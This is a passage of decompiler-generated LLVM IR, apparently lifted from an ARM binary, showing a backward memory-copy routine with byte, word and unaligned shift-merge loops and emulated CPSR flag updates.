  store i1 %v7_13b04, i1* %cpsr_n.global-to-local, align 1
  %v8_13b04 = icmp eq i32 %v2_13b04, 0
  store i1 %v8_13b04, i1* %cpsr_z.global-to-local, align 1
  %v5_13b08 = icmp slt i32 %v0_13b04, -8
  br i1 %v5_13b08, label %bb150, label %dec_label_pc_13b0c

dec_label_pc_13b0c:                               ; preds = %dec_label_pc_13b04
  %v6_13b0c = add i32 %v0_13b04, 4
  store i32 %v6_13b0c, i32* %r2.global-to-local, align 4
  %v8_13b0c = sub i32 -5, %v0_13b04
  %v9_13b0c = and i32 %v8_13b0c, %v2_13b04
  %v10_13b0c = icmp slt i32 %v9_13b0c, 0
  store i1 %v10_13b0c, i1* %cpsr_v.global-to-local, align 1
  %v11_13b0c = icmp slt i32 %v6_13b0c, 0
  store i1 %v11_13b0c, i1* %cpsr_n.global-to-local, align 1
  %v12_13b0c = icmp eq i32 %v2_13b04, 4
  store i1 %v12_13b0c, i1* %cpsr_z.global-to-local, align 1
  %v5_13b10 = icmp slt i32 %v2_13b04, 4
  %v6_13b10 = load i32, i32* @r1, align 4
  %v7_13b10 = add i32 %v6_13b10, -4
  %v8_13b10 = inttoptr i32 %v7_13b10 to i32*
  %v9_13b10 = load i32, i32* %v8_13b10, align 4
  store i32 %v9_13b10, i32* @r3, align 4
  br i1 %v5_13b10, label %.thread7, label %bb149

.thread7:                                         ; preds = %dec_label_pc_13b0c
  store i32 %v7_13b10, i32* @r1, align 4
  %v8_13b14 = add i32 %v7_13b14, -4
  %v9_13b14 = inttoptr i32 %v8_13b14 to i32*
  store i32 %v9_13b10, i32* %v9_13b14, align 4
  %v10_13b14 = load i32, i32* %r0.global-to-local, align 4
  %v11_13b14 = add i32 %v10_13b14, -4
  store i32 %v11_13b14, i32* %r0.global-to-local, align 4
  %v0_13b24.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_13b0c
  %v10_13b18 = add i32 %v6_13b10, -8
  %v11_13b18 = inttoptr i32 %v10_13b18 to i32*
  %v12_13b18 = load i32, i32* %v11_13b18, align 4
  store i32 %v12_13b18, i32* @ip, align 4
  store i32 %v10_13b18, i32* @r1, align 4
  %v7_13b1c = add i32 %v7_13b14, -8
  %v8_13b1c = inttoptr i32 %v7_13b1c to i32*
  store i32 %v9_13b10, i32* %v8_13b1c, align 4
  %v10_13b1c = add i32 %v7_13b14, -4
  %v11_13b1c = inttoptr i32 %v10_13b1c to i32*
  %v12_13b1c = load i32, i32* @ip, align 4
  store i32 %v12_13b1c, i32* %v11_13b1c, align 4
  store i32 %v7_13b1c, i32* %r0.global-to-local, align 4
  %v6_13b20 = load i32, i32* %r2.global-to-local, align 4
  %v7_13b20 = add i32 %v6_13b20, -4
  store i32 %v7_13b20, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread7, %.thread13, %dec_label_pc_13b04, %dec_label_pc_13a94, %dec_label_pc_13cc8, %dec_label_pc_13c5c, %dec_label_pc_13bf0, %bb149
  %v2_13b28 = phi i32 [ %v11_13b14, %.thread7 ], [ %v0_13bc019, %.thread13 ], [ %v7_13b14, %dec_label_pc_13b04 ], [ %v2_13a98, %dec_label_pc_13a94 ], [ %v2_13b3452, %dec_label_pc_13cc8 ], [ %v2_13b3451, %dec_label_pc_13c5c ], [ %v2_13b3450, %dec_label_pc_13bf0 ], [ %v7_13b1c, %bb149 ]
  %v0_13b24 = phi i32 [ %v0_13b24.pre, %.thread7 ], [ %v2_13b68, %.thread13 ], [ %v2_13b04, %dec_label_pc_13b04 ], [ %v2_13a9c, %dec_label_pc_13a94 ], [ %v0_13b2448, %dec_label_pc_13cc8 ], [ %v0_13b2447, %dec_label_pc_13c5c ], [ %v0_13b2446, %dec_label_pc_13bf0 ], [ %v7_13b20, %bb149 ]
  %v1_13b24 = add i32 %v0_13b24, 4
  store i32 %v1_13b24, i32* @r2, align 4
  %v3_13b24 = sub i32 0, %v0_13b24
  %v4_13b24 = and i32 %v1_13b24, %v3_13b24
  %v5_13b24 = icmp slt i32 %v4_13b24, 0
  store i1 %v5_13b24, i1* %cpsr_v.global-to-local, align 1
  %v6_13b24 = icmp slt i32 %v1_13b24, 0
  store i1 %v6_13b24, i1* %cpsr_n.global-to-local, align 1
  %v7_13b24 = icmp eq i32 %v1_13b24, 0
  store i1 %v7_13b24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13b24, label %.thread129, label %bb151

bb151:                                            ; preds = %bb150
  %v1_13b2c = add i32 %v0_13b24, 2
  %v3_13b2c = sub i32 -3, %v0_13b24
  %v4_13b2c = and i32 %v3_13b2c, %v1_13b24
  %v5_13b2c = icmp slt i32 %v4_13b2c, 0
  store i1 %v5_13b2c, i1* %cpsr_v.global-to-local, align 1
  %v6_13b2c = icmp slt i32 %v1_13b2c, 0
  store i1 %v6_13b2c, i1* %cpsr_n.global-to-local, align 1
  %v7_13b2c = icmp eq i32 %v1_13b24, 2
  store i1 %v7_13b2c, i1* %cpsr_z.global-to-local, align 1
  %v0_13b30 = load i32, i32* @r1, align 4
  %v1_13b30 = add i32 %v0_13b30, -1
  %v2_13b30 = inttoptr i32 %v1_13b30 to i8*
  %v3_13b30 = load i8, i8* %v2_13b30, align 1
  %v4_13b30 = zext i8 %v3_13b30 to i32
  store i32 %v4_13b30, i32* @r3, align 4
  store i32 %v1_13b30, i32* @r1, align 4
  %v3_13b34 = add i32 %v2_13b28, -1
  %v4_13b34 = inttoptr i32 %v3_13b34 to i8*
  store i8 %v3_13b30, i8* %v4_13b34, align 1
  %v5_13b34 = load i32, i32* %r0.global-to-local, align 4
  %v6_13b34 = add i32 %v5_13b34, -1
  store i32 %v6_13b34, i32* %r0.global-to-local, align 4
  %v0_13b38 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_13b38 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_13b38 = xor i1 %v0_13b38, %v1_13b38
  br i1 %v2_13b38, label %.thread128, label %bb152

bb152:                                            ; preds = %bb151
  %v3_13b38 = load i32, i32* @r1, align 4
  %v4_13b38 = add i32 %v3_13b38, -1
  %v5_13b38 = inttoptr i32 %v4_13b38 to i8*
  %v6_13b38 = load i8, i8* %v5_13b38, align 1
  %v7_13b38 = zext i8 %v6_13b38 to i32
  store i32 %v7_13b38, i32* @r3, align 4
  store i32 %v4_13b38, i32* @r1, align 4
  %v6_13b3c = add i32 %v5_13b34, -2
  %v7_13b3c = inttoptr i32 %v6_13b3c to i8*
  store i8 %v6_13b38, i8* %v7_13b3c, align 1
  %v8_13b3c = load i32, i32* %r0.global-to-local, align 4
  %v9_13b3c = add i32 %v8_13b3c, -1
  store i32 %v9_13b3c, i32* %r0.global-to-local, align 4
  %v1_13b40.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_13b40.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread128

.thread128:                                       ; preds = %bb151, %bb152
  %v7_13b44 = phi i32 [ %v9_13b3c, %bb152 ], [ %v6_13b34, %bb151 ]
  %v2_13b44 = phi i1 [ %v2_13b40.pre, %bb152 ], [ %v1_13b38, %bb151 ]
  %v1_13b44 = phi i1 [ %v1_13b40.pre, %bb152 ], [ %v0_13b38, %bb151 ]
  %v0_13b40 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_13b40 = xor i1 %v2_13b44, %v1_13b44
  %v4_13b40 = or i1 %v0_13b40, %v3_13b40
  br i1 %v4_13b40, label %.thread129, label %bb153

bb153:                                            ; preds = %.thread128
  %v5_13b40 = load i32, i32* @r1, align 4
  %v6_13b40 = add i32 %v5_13b40, -1
  %v7_13b40 = inttoptr i32 %v6_13b40 to i8*
  %v8_13b40 = load i8, i8* %v7_13b40, align 1
  %v9_13b40 = zext i8 %v8_13b40 to i32
  store i32 %v9_13b40, i32* @r3, align 4
  store i32 %v6_13b40, i32* @r1, align 4
  %v8_13b44 = add i32 %v7_13b44, -1
  %v9_13b44 = inttoptr i32 %v8_13b44 to i8*
  store i8 %v8_13b40, i8* %v9_13b44, align 1
  %v10_13b44 = load i32, i32* %r0.global-to-local, align 4
  %v11_13b44 = add i32 %v10_13b44, -1
  store i32 %v11_13b44, i32* %r0.global-to-local, align 4
  br label %.thread129

dec_label_pc_13b4c:                               ; preds = %dec_label_pc_13aa4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_13b4c = icmp eq i32 %v1_13aa4, 1
  store i1 %v8_13b4c, i1* %cpsr_n.global-to-local, align 1
  %v9_13b4c = icmp eq i32 %v1_13aa4, 2
  store i1 %v9_13b4c, i1* %cpsr_z.global-to-local, align 1
  %v1_13b50 = add i32 %v2_13a94, -1
  %v2_13b50 = inttoptr i32 %v1_13b50 to i8*
  %v3_13b50 = load i8, i8* %v2_13b50, align 1
  %v4_13b50 = zext i8 %v3_13b50 to i32
  store i32 %v4_13b50, i32* @r3, align 4
  store i32 %v1_13b50, i32* @r1, align 4
  %v3_13b54 = add i32 %v2_13a98, -1
  %v4_13b54 = inttoptr i32 %v3_13b54 to i8*
  store i8 %v3_13b50, i8* %v4_13b54, align 1
  %v5_13b54 = load i32, i32* %r0.global-to-local, align 4
  %v6_13b54 = add i32 %v5_13b54, -1
  store i32 %v6_13b54, i32* %r0.global-to-local, align 4
  br i1 %v8_13b4c, label %.thread13, label %bb154

bb154:                                            ; preds = %dec_label_pc_13b4c
  %v6_13b58 = load i32, i32* @r1, align 4
  %v7_13b58 = add i32 %v6_13b58, -1
  %v8_13b58 = inttoptr i32 %v7_13b58 to i8*
  %v9_13b58 = load i8, i8* %v8_13b58, align 1
  %v10_13b58 = zext i8 %v9_13b58 to i32
  store i32 %v10_13b58, i32* @r3, align 4
  store i32 %v7_13b58, i32* @r1, align 4
  %v9_13b5c = add i32 %v5_13b54, -2
  %v10_13b5c = inttoptr i32 %v9_13b5c to i8*
  store i8 %v9_13b58, i8* %v10_13b5c, align 1
  %v11_13b5c = load i32, i32* %r0.global-to-local, align 4
  %v12_13b5c = add i32 %v11_13b5c, -1
  store i32 %v12_13b5c, i32* %r0.global-to-local, align 4
  br i1 %v9_13b4c, label %.thread13, label %bb155

bb155:                                            ; preds = %bb154
  %v8_13b60 = load i32, i32* @r1, align 4
  %v9_13b60 = add i32 %v8_13b60, -1
  %v10_13b60 = inttoptr i32 %v9_13b60 to i8*
  %v11_13b60 = load i8, i8* %v10_13b60, align 1
  %v12_13b60 = zext i8 %v11_13b60 to i32
  store i32 %v12_13b60, i32* @r3, align 4
  store i32 %v9_13b60, i32* @r1, align 4
  %v11_13b64 = add i32 %v11_13b5c, -2
  %v12_13b64 = inttoptr i32 %v11_13b64 to i8*
  store i8 %v11_13b60, i8* %v12_13b64, align 1
  %v13_13b64 = load i32, i32* %r0.global-to-local, align 4
  %v14_13b64 = add i32 %v13_13b64, -1
  store i32 %v14_13b64, i32* %r0.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb154, %dec_label_pc_13b4c, %bb155
  %v0_13bc019 = phi i32 [ %v12_13b5c, %bb154 ], [ %v6_13b54, %dec_label_pc_13b4c ], [ %v14_13b64, %bb155 ]
  %v0_13b68 = load i32, i32* %r2.global-to-local, align 4
  %v1_13b68 = load i32, i32* @ip, align 4
  %v2_13b68 = sub i32 %v0_13b68, %v1_13b68
  store i32 %v2_13b68, i32* %r2.global-to-local, align 4
  %v4_13b68 = xor i32 %v1_13b68, %v0_13b68
  %v5_13b68 = xor i32 %v2_13b68, %v0_13b68
  %v6_13b68 = and i32 %v5_13b68, %v4_13b68
  %v7_13b68 = icmp slt i32 %v6_13b68, 0
  store i1 %v7_13b68, i1* %cpsr_v.global-to-local, align 1
  %v8_13b68 = icmp slt i32 %v2_13b68, 0
  store i1 %v8_13b68, i1* %cpsr_n.global-to-local, align 1
  %v9_13b68 = icmp eq i32 %v0_13b68, %v1_13b68
  store i1 %v9_13b68, i1* %cpsr_z.global-to-local, align 1
  %v5_13b6c = icmp slt i32 %v0_13b68, %v1_13b68
  br i1 %v5_13b6c, label %bb150, label %dec_label_pc_13b70

dec_label_pc_13b70:                               ; preds = %.thread13
  %v0_13b70 = load i32, i32* @r1, align 4
  %v1_13b70 = urem i32 %v0_13b70, 4
  store i32 %v1_13b70, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13b70 = icmp eq i32 %v1_13b70, 0
  store i1 %v2_13b70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13b70, label %dec_label_pc_13ab4, label %dec_label_pc_13b78

dec_label_pc_13b78:                               ; preds = %dec_label_pc_13aac, %dec_label_pc_13b70
  %v0_13bc018 = phi i32 [ %v2_13a98, %dec_label_pc_13aac ], [ %v0_13bc019, %dec_label_pc_13b70 ]
  %v0_13c6c = phi i32 [ %v2_13a9c, %dec_label_pc_13aac ], [ %v2_13b68, %dec_label_pc_13b70 ]
  %v0_13b78 = phi i32 [ %v2_13a94, %dec_label_pc_13aac ], [ %v0_13b70, %dec_label_pc_13b70 ]
  %v0_13b80 = phi i32 [ %v1_13aac, %dec_label_pc_13aac ], [ %v1_13b70, %dec_label_pc_13b70 ]
  %v1_13b78 = and i32 %v0_13b78, -4
  store i32 %v1_13b78, i32* %r1.global-to-local, align 4
  %v1_13b7c = inttoptr i32 %v1_13b78 to i32*
  %v2_13b7c = load i32, i32* %v1_13b7c, align 4
  store i32 %v2_13b7c, i32* @r3, align 4
  %v7_13b80 = icmp ult i32 %v0_13b80, 2
  %v2_13c64 = add i32 %v0_13c6c, -12
  %v4_13c64 = sub i32 11, %v0_13c6c
  %v5_13c64 = and i32 %v4_13c64, %v0_13c6c
  %v6_13c64 = icmp slt i32 %v5_13c64, 0
  store i1 %v6_13c64, i1* %cpsr_v.global-to-local, align 1
  %v7_13c64 = icmp slt i32 %v2_13c64, 0
  store i1 %v7_13c64, i1* %cpsr_n.global-to-local, align 1
  %v8_13c64 = icmp eq i32 %v0_13c6c, 12
  store i1 %v8_13c64, i1* %cpsr_z.global-to-local, align 1
  %v5_13c68 = icmp slt i32 %v0_13c6c, 12
  br i1 %v7_13b80, label %dec_label_pc_13c64, label %dec_label_pc_13b88

dec_label_pc_13b88:                               ; preds = %dec_label_pc_13b78
  %v8_13b80 = icmp eq i32 %v0_13b80, 2
  br i1 %v8_13b80, label %dec_label_pc_13bf8, label %dec_label_pc_13b8c

dec_label_pc_13b8c:                               ; preds = %dec_label_pc_13b88
  br i1 %v5_13c68, label %dec_label_pc_13bd8, label %dec_label_pc_13b94

dec_label_pc_13b94:                               ; preds = %dec_label_pc_13b8c
  store i32 %v2_13c64, i32* %r2.global-to-local, align 4
  %v3_13b98 = load i32, i32* @r4, align 4
  store i32 %v3_13b98, i32* %stack_var_-12, align 4
  %v6_13b98 = load i32, i32* @r5, align 4
  %v8_13b98 = inttoptr i32 %v6_13b98 to i8*
  store i8* %v8_13b98, i8** %stack_var_-8, align 4
  %v11_13b98 = load i32, i32* @lr, align 4
  br label %dec_label_pc_13b9c

dec_label_pc_13b9c:                               ; preds = %dec_label_pc_13b9c.dec_label_pc_13b9c_crit_edge, %dec_label_pc_13b94
  %v0_13bc0 = phi i32 [ %v1_13bc0, %dec_label_pc_13b9c.dec_label_pc_13b9c_crit_edge ], [ %v0_13bc018, %dec_label_pc_13b94 ]
  %v0_13ba0 = phi i32 [ %v0_13ba0.pre, %dec_label_pc_13b9c.dec_label_pc_13b9c_crit_edge ], [ %v1_13b78, %dec_label_pc_13b94 ]
  %v0_13b9c = phi i32 [ %v0_13b9c.pre, %dec_label_pc_13b9c.dec_label_pc_13b9c_crit_edge ], [ %v2_13b7c, %dec_label_pc_13b94 ]
  %v3_13b9c = mul i32 %v0_13b9c, 256
  store i32 %v3_13b9c, i32* %lr.global-to-local, align 4
  %v1_13ba0 = add i32 %v0_13ba0, -4
  %v2_13ba0 = inttoptr i32 %v1_13ba0 to i32*
  %v3_13ba0 = load i32, i32* %v2_13ba0, align 4
  store i32 %v3_13ba0, i32* @r3, align 4
  %v4_13ba0 = add i32 %v0_13ba0, -8
  %v5_13ba0 = inttoptr i32 %v4_13ba0 to i32*
  %v6_13ba0 = load i32, i32* %v5_13ba0, align 4
  store i32 %v6_13ba0, i32* %r4.global-to-local, align 4
  %v7_13ba0 = add i32 %v0_13ba0, -12
  %v8_13ba0 = inttoptr i32 %v7_13ba0 to i32*
  %v9_13ba0 = load i32, i32* %v8_13ba0, align 4
  store i32 %v9_13ba0, i32* %r5.global-to-local, align 4
  %v10_13ba0 = add i32 %v0_13ba0, -16
  %v11_13ba0 = inttoptr i32 %v10_13ba0 to i32*
  %v12_13ba0 = load i32, i32* %v11_13ba0, align 4
  store i32 %v10_13ba0, i32* %r1.global-to-local, align 4
  %v4_13ba4 = udiv i32 %v12_13ba0, 16777216
  %v5_13ba4 = or i32 %v4_13ba4, %v3_13b9c
  store i32 %v5_13ba4, i32* %lr.global-to-local, align 4
  %v3_13ba8 = mul i32 %v12_13ba0, 256
  %v4_13bac = udiv i32 %v9_13ba0, 16777216
  %v5_13bac = or i32 %v3_13ba8, %v4_13bac
  store i32 %v5_13bac, i32* @ip, align 4
  %v3_13bb0 = mul i32 %v9_13ba0, 256
  %v4_13bb4 = udiv i32 %v6_13ba0, 16777216
  %v5_13bb4 = or i32 %v3_13bb0, %v4_13bb4
  store i32 %v5_13bb4, i32* %r5.global-to-local, align 4
  %v3_13bb8 = mul i32 %v6_13ba0, 256
  %v4_13bbc = udiv i32 %v3_13ba0, 16777216
  %v5_13bbc = or i32 %v3_13bb8, %v4_13bbc
  store i32 %v5_13bbc, i32* %r4.global-to-local, align 4
  %v1_13bc0 = add i32 %v0_13bc0, -16
  %v2_13bc0 = inttoptr i32 %v1_13bc0 to i32*
  store i32 %v5_13bbc, i32* %v2_13bc0, align 4
  %v4_13bc0 = add i32 %v0_13bc0, -12
  %v5_13bc0 = inttoptr i32 %v4_13bc0 to i32*
  %v6_13bc0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_13bc0, i32* %v5_13bc0, align 4
  %v7_13bc0 = add i32 %v0_13bc0, -8
  %v8_13bc0 = inttoptr i32 %v7_13bc0 to i32*
  %v9_13bc0 = load i32, i32* @ip, align 4
  store i32 %v9_13bc0, i32* %v8_13bc0, align 4
  %v10_13bc0 = add i32 %v0_13bc0, -4
  %v11_13bc0 = inttoptr i32 %v10_13bc0 to i32*
  %v12_13bc0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_13bc0, i32* %v11_13bc0, align 4
  store i32 %v1_13bc0, i32* %r0.global-to-local, align 4
  %v0_13bc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_13bc4 = add i32 %v0_13bc4, -16
  store i32 %v2_13bc4, i32* %r2.global-to-local, align 4
  %v6_13bc8 = icmp slt i32 %v0_13bc4, 16
  br i1 %v6_13bc8, label %dec_label_pc_13bcc, label %dec_label_pc_13b9c.dec_label_pc_13b9c_crit_edge

dec_label_pc_13b9c.dec_label_pc_13b9c_crit_edge:  ; preds = %dec_label_pc_13b9c
  %v0_13b9c.pre = load i32, i32* @r3, align 4
  %v0_13ba0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13b9c

dec_label_pc_13bcc:                               ; preds = %dec_label_pc_13b9c
  %v2_13bcc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13bcc, i32* @r4, align 4
  %v5_13bcc = load i8*, i8** %stack_var_-8, align 4
  %v6_13bcc = ptrtoint i8* %v5_13bcc to i32
  store i32 %v6_13bcc, i32* @r5, align 4
  store i32 %v11_13b98, i32* @lr, align 4
  %v2_13bd0 = add i32 %v0_13bc4, -4
  store i32 %v2_13bd0, i32* %r2.global-to-local, align 4
  %v4_13bd0 = add i32 %v0_13bc4, 2147483632
  %v5_13bd0 = and i32 %v2_13bd0, %v4_13bd0
  %v6_13bd0 = icmp slt i32 %v5_13bd0, 0
  store i1 %v6_13bd0, i1* %cpsr_v.global-to-local, align 1
  %v7_13bd0 = icmp slt i32 %v2_13bd0, 0
  store i1 %v7_13bd0, i1* %cpsr_n.global-to-local, align 1
  %v8_13bd0 = icmp eq i32 %v2_13bd0, 0
  store i1 %v8_13bd0, i1* %cpsr_z.global-to-local, align 1
  %v5_13bd4 = icmp slt i32 %v2_13bc4, -12
  br i1 %v5_13bd4, label %dec_label_pc_13bf0, label %dec_label_pc_13bd8

dec_label_pc_13bd8:                               ; preds = %dec_label_pc_13bcc, %dec_label_pc_13b8c, %dec_label_pc_13bd8
  %v1_13be4 = phi i32 [ %v5_13be4, %dec_label_pc_13bd8 ], [ %v1_13bc0, %dec_label_pc_13bcc ], [ %v0_13bc018, %dec_label_pc_13b8c ]
  %v0_13bd8 = load i32, i32* @r3, align 4
  %v3_13bd8 = mul i32 %v0_13bd8, 256
  store i32 %v3_13bd8, i32* %ip.global-to-local, align 4
  %v0_13bdc = load i32, i32* %r1.global-to-local, align 4
  %v1_13bdc = add i32 %v0_13bdc, -4
  %v2_13bdc = inttoptr i32 %v1_13bdc to i32*
  %v3_13bdc = load i32, i32* %v2_13bdc, align 4
  store i32 %v3_13bdc, i32* @r3, align 4
  store i32 %v1_13bdc, i32* %r1.global-to-local, align 4
  %v4_13be0 = udiv i32 %v3_13bdc, 16777216
  %v5_13be0 = or i32 %v4_13be0, %v3_13bd8
  store i32 %v5_13be0, i32* @ip, align 4
  %v2_13be4 = add i32 %v1_13be4, -4
  %v3_13be4 = inttoptr i32 %v2_13be4 to i32*
  store i32 %v5_13be0, i32* %v3_13be4, align 4
  %v4_13be4 = load i32, i32* %r0.global-to-local, align 4
  %v5_13be4 = add i32 %v4_13be4, -4
  store i32 %v5_13be4, i32* %r0.global-to-local, align 4
  %v0_13be8 = load i32, i32* %r2.global-to-local, align 4
  %v2_13be8 = add i32 %v0_13be8, -4
  store i32 %v2_13be8, i32* %r2.global-to-local, align 4
  %v6_13bec = icmp slt i32 %v0_13be8, 4
  br i1 %v6_13bec, label %dec_label_pc_13bf0.loopexit, label %dec_label_pc_13bd8

dec_label_pc_13bf0.loopexit:                      ; preds = %dec_label_pc_13bd8
  %v4_13be8 = sub i32 3, %v0_13be8
  %v5_13be8 = and i32 %v4_13be8, %v0_13be8
  %v6_13be8 = icmp slt i32 %v5_13be8, 0
  %v7_13be8 = icmp slt i32 %v2_13be8, 0
  store i1 %v6_13be8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_13be8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13bf0

dec_label_pc_13bf0:                               ; preds = %dec_label_pc_13bf0.loopexit, %dec_label_pc_13bcc
  %v2_13b3450 = phi i32 [ %v5_13be4, %dec_label_pc_13bf0.loopexit ], [ %v1_13bc0, %dec_label_pc_13bcc ]
  %v0_13b2446 = phi i32 [ %v2_13be8, %dec_label_pc_13bf0.loopexit ], [ %v2_13bd0, %dec_label_pc_13bcc ]
  %v0_13bf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_13bf0 = add i32 %v0_13bf0, 3
  store i32 %v1_13bf0, i32* @r1, align 4
  br label %bb150

dec_label_pc_13bf8:                               ; preds = %dec_label_pc_13b88
  br i1 %v5_13c68, label %dec_label_pc_13c44, label %dec_label_pc_13c00

dec_label_pc_13c00:                               ; preds = %dec_label_pc_13bf8
  store i32 %v2_13c64, i32* %r2.global-to-local, align 4
  %v3_13c04 = load i32, i32* @r4, align 4
  store i32 %v3_13c04, i32* %stack_var_-12, align 4
  %v6_13c04 = load i32, i32* @r5, align 4
  %v8_13c04 = inttoptr i32 %v6_13c04 to i8*
  store i8* %v8_13c04, i8** %stack_var_-8, align 4
  %v11_13c04 = load i32, i32* @lr, align 4
  br label %dec_label_pc_13c08

dec_label_pc_13c08:                               ; preds = %dec_label_pc_13c08.dec_label_pc_13c08_crit_edge, %dec_label_pc_13c00
  %v0_13c2c = phi i32 [ %v1_13c2c, %dec_label_pc_13c08.dec_label_pc_13c08_crit_edge ], [ %v0_13bc018, %dec_label_pc_13c00 ]
  %v0_13c0c = phi i32 [ %v0_13c0c.pre, %dec_label_pc_13c08.dec_label_pc_13c08_crit_edge ], [ %v1_13b78, %dec_label_pc_13c00 ]
  %v0_13c08 = phi i32 [ %v0_13c08.pre, %dec_label_pc_13c08.dec_label_pc_13c08_crit_edge ], [ %v2_13b7c, %dec_label_pc_13c00 ]
  %v3_13c08 = mul i32 %v0_13c08, 65536
  store i32 %v3_13c08, i32* %lr.global-to-local, align 4
  %v1_13c0c = add i32 %v0_13c0c, -4
  %v2_13c0c = inttoptr i32 %v1_13c0c to i32*
  %v3_13c0c = load i32, i32* %v2_13c0c, align 4
  store i32 %v3_13c0c, i32* @r3, align 4
  %v4_13c0c = add i32 %v0_13c0c, -8
  %v5_13c0c = inttoptr i32 %v4_13c0c to i32*
  %v6_13c0c = load i32, i32* %v5_13c0c, align 4
  store i32 %v6_13c0c, i32* %r4.global-to-local, align 4
  %v7_13c0c = add i32 %v0_13c0c, -12
  %v8_13c0c = inttoptr i32 %v7_13c0c to i32*
  %v9_13c0c = load i32, i32* %v8_13c0c, align 4
  store i32 %v9_13c0c, i32* %r5.global-to-local, align 4
  %v10_13c0c = add i32 %v0_13c0c, -16
  %v11_13c0c = inttoptr i32 %v10_13c0c to i32*
  %v12_13c0c = load i32, i32* %v11_13c0c, align 4
  store i32 %v10_13c0c, i32* %r1.global-to-local, align 4
  %v4_13c10 = udiv i32 %v12_13c0c, 65536
  %v5_13c10 = or i32 %v4_13c10, %v3_13c08
  store i32 %v5_13c10, i32* %lr.global-to-local, align 4
  %v3_13c14 = mul i32 %v12_13c0c, 65536
  %v4_13c18 = udiv i32 %v9_13c0c, 65536
  %v5_13c18 = or i32 %v3_13c14, %v4_13c18
  store i32 %v5_13c18, i32* @ip, align 4
  %v3_13c1c = mul i32 %v9_13c0c, 65536
  %v4_13c20 = udiv i32 %v6_13c0c, 65536
  %v5_13c20 = or i32 %v3_13c1c, %v4_13c20
  store i32 %v5_13c20, i32* %r5.global-to-local, align 4
  %v3_13c24 = mul i32 %v6_13c0c, 65536
  %v4_13c28 = udiv i32 %v3_13c0c, 65536
  %v5_13c28 = or i32 %v3_13c24, %v4_13c28
  store i32 %v5_13c28, i32* %r4.global-to-local, align 4
  %v1_13c2c = add i32 %v0_13c2c, -16
  %v2_13c2c = inttoptr i32 %v1_13c2c to i32*
  store i32 %v5_13c28, i32* %v2_13c2c, align 4
  %v4_13c2c = add i32 %v0_13c2c, -12
  %v5_13c2c = inttoptr i32 %v4_13c2c to i32*
  %v6_13c2c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_13c2c, i32* %v5_13c2c, align 4
  %v7_13c2c = add i32 %v0_13c2c, -8
  %v8_13c2c = inttoptr i32 %v7_13c2c to i32*
  %v9_13c2c = load i32, i32* @ip, align 4
  store i32 %v9_13c2c, i32* %v8_13c2c, align 4
  %v10_13c2c = add i32 %v0_13c2c, -4
  %v11_13c2c = inttoptr i32 %v10_13c2c to i32*
  %v12_13c2c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_13c2c, i32* %v11_13c2c, align 4
  store i32 %v1_13c2c, i32* %r0.global-to-local, align 4
  %v0_13c30 = load i32, i32* %r2.global-to-local, align 4
  %v2_13c30 = add i32 %v0_13c30, -16
  store i32 %v2_13c30, i32* %r2.global-to-local, align 4
  %v6_13c34 = icmp slt i32 %v0_13c30, 16
  br i1 %v6_13c34, label %dec_label_pc_13c38, label %dec_label_pc_13c08.dec_label_pc_13c08_crit_edge

dec_label_pc_13c08.dec_label_pc_13c08_crit_edge:  ; preds = %dec_label_pc_13c08
  %v0_13c08.pre = load i32, i32* @r3, align 4
  %v0_13c0c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13c08

dec_label_pc_13c38:                               ; preds = %dec_label_pc_13c08
  %v2_13c38 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13c38, i32* @r4, align 4
  %v5_13c38 = load i8*, i8** %stack_var_-8, align 4
  %v6_13c38 = ptrtoint i8* %v5_13c38 to i32
  store i32 %v6_13c38, i32* @r5, align 4
  store i32 %v11_13c04, i32* @lr, align 4
  %v2_13c3c = add i32 %v0_13c30, -4
  store i32 %v2_13c3c, i32* %r2.global-to-local, align 4
  %v4_13c3c = add i32 %v0_13c30, 2147483632
  %v5_13c3c = and i32 %v2_13c3c, %v4_13c3c
  %v6_13c3c = icmp slt i32 %v5_13c3c, 0
  store i1 %v6_13c3c, i1* %cpsr_v.global-to-local, align 1
  %v7_13c3c = icmp slt i32 %v2_13c3c, 0
  store i1 %v7_13c3c, i1* %cpsr_n.global-to-local, align 1
  %v8_13c3c = icmp eq i32 %v2_13c3c, 0
  store i1 %v8_13c3c, i1* %cpsr_z.global-to-local, align 1
  %v5_13c40 = icmp slt i32 %v2_13c30, -12
  br i1 %v5_13c40, label %dec_label_pc_13c5c, label %dec_label_pc_13c44

dec_label_pc_13c44:                               ; preds = %dec_label_pc_13c38, %dec_label_pc_13bf8, %dec_label_pc_13c44
  %v1_13c50 = phi i32 [ %v5_13c50, %dec_label_pc_13c44 ], [ %v1_13c2c, %dec_label_pc_13c38 ], [ %v0_13bc018, %dec_label_pc_13bf8 ]
  %v0_13c44 = load i32, i32* @r3, align 4
  %v3_13c44 = mul i32 %v0_13c44, 65536
  store i32 %v3_13c44, i32* %ip.global-to-local, align 4
  %v0_13c48 = load i32, i32* %r1.global-to-local, align 4
  %v1_13c48 = add i32 %v0_13c48, -4
  %v2_13c48 = inttoptr i32 %v1_13c48 to i32*
  %v3_13c48 = load i32, i32* %v2_13c48, align 4
  store i32 %v3_13c48, i32* @r3, align 4
